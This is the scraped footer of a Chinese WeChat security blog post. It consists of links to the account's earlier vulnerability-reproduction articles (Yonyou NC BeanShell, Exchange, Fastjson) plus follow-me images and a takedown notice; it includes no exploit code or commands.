[【CNVD-2021-30167 | 附 PoC】用友 NC BeanShell 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“**如侵权请私聊公众号删文**”

公众号